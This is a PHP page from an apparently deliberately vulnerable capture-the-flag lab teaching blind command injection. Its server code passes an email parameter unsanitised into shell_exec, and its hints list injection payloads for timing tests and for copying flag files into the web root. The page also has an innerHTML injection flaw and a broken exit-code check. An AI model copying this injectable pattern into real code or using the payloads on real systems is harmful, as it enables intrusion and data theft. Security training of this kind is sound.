<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 5 - Blind Command Injection</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>👁️‍🗨️ Level 5 - Blind Command Injection</h1>
            <p><strong>Objective:</strong> Thực hiện command injection khi không thể thấy output trực tiếp</p>
        </div>

        <div class="form-container">
            <h3>🔍 Email Validator:</h3>
            <p>Công cụ này validate email bằng cách ping domain. Output không hiển thị vì lý do bảo mật.</p>
            
            <div class="code-block">Command: ping -c 1 $(echo <?php echo htmlspecialchars($_GET['email'] ?? '[EMAIL]'); ?> | cut -d@ -f2) > /dev/null 2>&1</div>
            
            <?php
            if (isset($_GET['email'])) {
                // Initialize level-specific flag access
                require_once 'flag_system.php';
                get_level_flag(5);
                
                echo '<h3>📊 Result:</h3>';
                echo '<div class="result">';
                
                $email = $_GET['email'];
                
                // Extract domain and ping it (blind - no output shown)
                $command = "ping -c 1 $(echo " . $email . " | cut -d@ -f2) > /dev/null 2>&1";
                
                // Execute command but don't show output for "security"
                $result = shell_exec($command);
                $exit_code = shell_exec("echo $?");
                
                // Only show generic success/failure
                if (trim($exit_code) == "0") {
                    echo '<div class="success">✅ Email domain is reachable</div>';
                } else {
                    echo '<div class="error">❌ Email domain is not reachable</div>';
                }
                
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Input:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="email">Email Address:</label>
                    <input type="text" id="email" name="email" value="<?php echo htmlspecialchars($_GET['email'] ?? ''); ?>" placeholder="Enter email (e.g., user@google.com)" oninput="updateCommand()">
                </div>
                <button type="submit" class="btn">🚀 Validate Email</button>
            </form>

            <div class="info-card" style="margin: 20px 0;">
                <h3>👁️‍🗨️ Blind Injection Characteristics</h3>
                <ul>
                    <li><strong>No direct output:</strong> Command results are hidden</li>
                    <li><strong>Limited feedback:</strong> Only success/failure status</li>
                    <li><strong>Challenge:</strong> Detect injection without seeing output</li>
                    <li><strong>Methods:</strong> Time delays, file operations, network requests</li>
                </ul>
            </div>

            <div class="info-card" style="margin: 20px 0;">
                <h3>🔍 Blind Detection Techniques</h3>
                <ul>
                    <li><strong>Time-based:</strong> sleep, ping with delays</li>
                    <li><strong>File-based:</strong> Create/modify files in web directory</li>
                    <li><strong>Network-based:</strong> DNS requests, HTTP callbacks</li>
                    <li><strong>Error-based:</strong> Force different error conditions</li>
                    <li><strong>Boolean-based:</strong> Conditional responses</li>
                </ul>
            </div>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Understanding Blind Injection</h4>
                    <p><strong>Current Command:</strong> <code>ping -c 1 $(echo [EMAIL] | cut -d@ -f2) > /dev/null 2>&1</code></p>
                    <p>📝 <strong>Test normal:</strong> <code>user@google.com</code> (should show reachable)</p>
                    <p>📝 <strong>Test invalid:</strong> <code>user@invalid.domain</code> (should show not reachable)</p>
                    <p>🎯 <strong>Key insight:</strong> You can only see success/failure, not actual output</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: Basic Injection Detection</h4>
                    <p><strong>Concept:</strong> Inject commands that create observable side effects</p>
                    <p>📝 <strong>Test injection:</strong> <code>user@google.com; whoami</code></p>
                    <p>🎯 <strong>What happens:</strong> Command executes but output is hidden</p>
                    <p><strong>Detection methods:</strong></p>
                    <p>• Time delays to confirm execution</p>
                    <p>• File operations in accessible directories</p>
                    <p>• Network requests to external servers</p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: Time-based Detection</h4>
                    <p><strong>Concept:</strong> Use sleep command to create detectable delays</p>
                    <p>📝 <strong>Test:</strong> <code>user@google.com; sleep 5</code></p>
                    <p>🎯 <strong>Observation:</strong> Page should take 5+ seconds to load</p>
                    <p><strong>Variations:</strong></p>
                    <p>• <code>user@google.com && sleep 3</code></p>
                    <p>• <code>user@google.com | sleep 2</code></p>
                    <p>• <code>user@google.com; ping -c 10 127.0.0.1</code></p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: File-based Detection</h4>
                    <p><strong>Concept:</strong> Create files in web-accessible directories</p>
                    <p>📝 <strong>Test:</strong> <code>user@google.com; touch /var/www/html/proof.txt</code></p>
                    <p>🎯 <strong>Verification:</strong> Check if file exists via browser</p>
                    <p><strong>More examples:</strong></p>
                    <p>• <code>user@google.com; echo "injected" > /var/www/html/test.txt</code></p>
                    <p>• <code>user@google.com; whoami > /var/www/html/user.txt</code></p>
                    <p>• <code>user@google.com; ls -la > /var/www/html/listing.txt</code></p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>💡 Hint 5: Data Exfiltration Techniques</h4>
                    <p><strong>Read files and save to accessible location:</strong></p>
                    <p>📝 <strong>Copy flags:</strong> <code>user@google.com; cp /tmp/blind_flag.txt /var/www/html/</code></p>
                    <p>📝 <strong>Base64 encode:</strong> <code>user@google.com; base64 /tmp/blind_flag.txt > /var/www/html/flag_b64.txt</code></p>
                    <p><strong>Advanced techniques:</strong></p>
                    <p>• <code>user@google.com; cat /tmp/blind_flag.txt | xxd > /var/www/html/flag_hex.txt</code></p>
                    <p>• <code>user@google.com; od -c /tmp/blind_flag.txt > /var/www/html/flag_od.txt</code></p>
                </div>
                <div id="hint-6" class="hint-box" style="display: none;">
                    <h4>💡 Hint 6: Boolean-based Detection</h4>
                    <p><strong>Concept:</strong> Use conditional commands to test conditions</p>
                    <p>📝 <strong>File existence test:</strong> <code>user@google.com && [ -f /tmp/blind_flag.txt ] && sleep 5</code></p>
                    <p>🎯 <strong>Logic:</strong> Sleep only if file exists</p>
                    <p><strong>Content testing:</strong></p>
                    <p>• <code>user@google.com && grep -q "FLAG" /tmp/blind_flag.txt && sleep 3</code></p>
                    <p>• <code>user@google.com && [ $(wc -l < /tmp/blind_flag.txt) -eq 1 ] && sleep 2</code></p>
                </div>
                <div id="hint-7" class="hint-box" style="display: none;">
                    <h4>🎯 Hint 7: Extract the Flag!</h4>
                    <p><strong>🚀 Target file:</strong> <code>/tmp/level5_flag.txt</code></p>
                    <p><strong>Method 1 (Direct copy):</strong> <code>user@google.com; cp /tmp/level5_flag.txt /var/www/html/</code></p>
                    <p><strong>Method 2 (Redirect):</strong> <code>user@google.com; cat /tmp/level5_flag.txt > /var/www/html/flag.txt</code></p>
                    <p><strong>Method 3 (Base64):</strong> <code>user@google.com; base64 /tmp/level5_flag.txt > /var/www/html/encoded.txt</code></p>
                    <p><strong>🔍 Access your extracted file:</strong></p>
                    <p>After successful injection, visit: <code>http://localhost:8080/level5_flag.txt</code></p>
                    <p><strong>💡 Verification first:</strong> <code>user@google.com; echo "test" > /var/www/html/test.txt</code></p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="level4.php">⬅️ Previous Level</a>
            <a href="index.php">🏠 Home</a>
            <a href="level6.php">➡️ Next Level</a>
            <a href="submit.php?level=5">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 7;

    function updateCommand() {
        const input = document.getElementById('email').value;
        const codeBlock = document.querySelector('.code-block');
        codeBlock.innerHTML = 'Command: ping -c 1 $(echo ' + (input || '[EMAIL]') + ' | cut -d@ -f2) > /dev/null 2>&1';
    }

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint >= maxHints) {
                document.querySelector('.hint-btn').textContent = '✅ All hints viewed';
                document.querySelector('.hint-btn').disabled = true;
                document.querySelector('.hint-btn').style.opacity = '0.6';
            } else {
                document.querySelector('.hint-btn').textContent = `💡 Next Hint (${currentHint}/${maxHints})`;
            }
        }
    }
    </script>
</body>
</html>
